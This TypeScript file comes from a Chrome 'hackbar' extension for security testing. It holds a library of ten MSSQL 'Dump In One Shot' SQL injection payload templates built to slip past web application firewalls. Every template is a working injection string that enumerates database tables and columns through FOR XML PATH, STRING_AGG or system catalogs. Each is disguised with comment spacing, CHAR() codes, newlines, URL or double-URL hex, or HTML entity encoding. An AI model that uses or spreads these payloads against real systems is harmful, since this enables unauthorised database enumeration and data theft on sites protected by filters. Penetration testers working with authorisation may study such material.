/**
 * XEOO HACKBAR — Security Testing & HTTP Inspection Chrome Extension
 * 
 * @module WafBasedDiosMssql
 * @author Zone Xploiter / ZXMarchia
 * @license MIT
 * @description WAF-Evasion Microsoft SQL Server (MSSQL) Dump In One Shot templates.
 */

import { BuilderSubcategory, BuilderTemplate } from '../../types';

export const wafDiosMssqlTemplates: BuilderTemplate[] = [
  {
    id: 'waf-dios-mssql-for-xml-path',
    name: 'FOR XML PATH(\'\') Inline Comment (/**/) WAF',
    tags: ['mssql', 'waf-bypass', 'xml-path'],
    description: 'MSSQL WAF bypass extraction via FOR XML PATH and CHAR(58) colon delimiter',
    content: "(SELECT/**/table_name+CHAR(58)+column_name+CHAR(10)/**/FROM/**/information_schema.columns/**/FOR/**/XML/**/PATH(''))"
  },
  {
    id: 'waf-dios-mssql-no-quotes-char',
    name: 'FOR XML PATH(CHAR(0)) No Quotes WAF',
    tags: ['mssql', 'waf-bypass', 'no-quotes'],
    description: 'Unquoted MSSQL DIOS avoiding string literal single quotes',
    content: "(SELECT/**/table_name+CHAR(58)+column_name+CHAR(10)/**/FROM/**/information_schema.columns/**/FOR/**/XML/**/PATH(CHAR(0)))"
  },
  {
    id: 'waf-dios-mssql-string-agg',
    name: 'STRING_AGG() WAF (MSSQL 2017+)',
    tags: ['mssql', 'waf-bypass', 'string_agg'],
    description: 'Modern STRING_AGG extraction with inline comments and CHAR delimiters',
    content: "(SELECT/**/STRING_AGG(table_name+CHAR(58)+column_name,CHAR(10))/**/FROM/**/information_schema.columns)"
  },
  {
    id: 'waf-dios-mssql-sys-catalog',
    name: 'sys.tables & sys.columns WAF DIOS',
    tags: ['mssql', 'waf-bypass', 'sys-catalog'],
    description: 'Bypass information_schema filters via internal sys tables and columns',
    content: "(SELECT/**/t.name+CHAR(58)+c.name+CHAR(10)/**/FROM/**/sys.tables/**/t/**/JOIN/**/sys.columns/**/c/**/ON/**/t.object_id=c.object_id/**/FOR/**/XML/**/PATH(''))"
  },
  {
    id: 'waf-dios-mssql-sysobjects-char',
    name: 'sysobjects WAF (CHAR(85) = \'U\')',
    tags: ['mssql', 'waf-bypass', 'sysobjects'],
    description: 'Legacy MSSQL extraction with CHAR(85) user table filter bypass',
    content: "(SELECT/**/o.name+CHAR(58)+c.name+CHAR(10)/**/FROM/**/sysobjects/**/o/**/JOIN/**/syscolumns/**/c/**/ON/**/o.id=c.id/**/WHERE/**/o.xtype=CHAR(85)/**/FOR/**/XML/**/PATH(''))"
  },
  {
    id: 'waf-dios-mssql-newline-spaces',
    name: 'No Space (%0A / Newline) MSSQL DIOS',
    tags: ['mssql', 'waf-bypass', 'whitespace'],
    description: 'Newline-separated MSSQL DIOS bypassing whitespace filters',
    content: "(SELECT%0Atable_name+':'+column_name+CHAR(10)%0AFROM%0Ainformation_schema.columns%0AFOR%0AXML%0APATH(''))"
  },
  {
    id: 'waf-dios-mssql-url-hex',
    name: 'URL Hex Encoded (%xx) MSSQL XML DIOS',
    tags: ['mssql', 'url-hex', 'waf-bypass'],
    description: 'URL percent-hex encoded MSSQL FOR XML PATH DIOS',
    content: "(SELECT/**/table_name%2bCHAR%2858%29%2bcolumn_name%2bCHAR%2810%29/**/FROM/**/information_schema.columns/**/FOR/**/XML/**/PATH%28%27%27%29)"
  },
  {
    id: 'waf-dios-mssql-double-url-hex',
    name: 'Double URL Hex (%25xx) MSSQL DIOS',
    tags: ['mssql', 'double-hex', 'gateway-bypass'],
    description: 'Double percent-hex encoded MSSQL DIOS for multi-layer proxies',
    content: "%2528SELECT/**/table_name%252bCHAR(58)%252bcolumn_name%252bCHAR(10)/**/FROM/**/information_schema.columns/**/FOR/**/XML/**/PATH(%2527%2527)%2529"
  },
  {
    id: 'waf-dios-mssql-html-hex',
    name: 'HTML Entity Hex (&#x..;) MSSQL DIOS',
    tags: ['mssql', 'html-hex', 'entity-decode'],
    description: 'Numeric hexadecimal HTML entity encoded MSSQL FOR XML PATH',
    content: "(&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; table_name+CHAR(58)+column_name+CHAR(10) &#x46;&#x52;&#x4f;&#x4d; information_schema.columns FOR XML PATH(''))"
  },
  {
    id: 'waf-dios-mssql-sys-tables-catalog',
    name: 'WAF sys.tables & sys.columns Catalog DIOS',
    tags: ['mssql', 'waf-bypass', 'sys-tables', 'catalog'],
    description: 'WAF obfuscated SQL Server catalog extraction using sys.tables and sys.columns',
    content: "(SELECT/**/t.name+CHAR(58)+c.name+CHAR(10)/**/FROM/**/sys.tables/**/t/**/JOIN/**/sys.columns/**/c/**/ON/**/t.object_id=c.object_id/**/FOR/**/XML/**/PATH(''))"
  }
];

export const diosMssqlSubcategory: BuilderSubcategory = {
  id: 'dios-mssql',
  label: 'DIOS MSSQL',
  description: 'WAF bypass Microsoft SQL Server Dump In One Shot templates (FOR XML PATH, STRING_AGG, URL hex, double hex, HTML entity hex)',
  templates: wafDiosMssqlTemplates
};
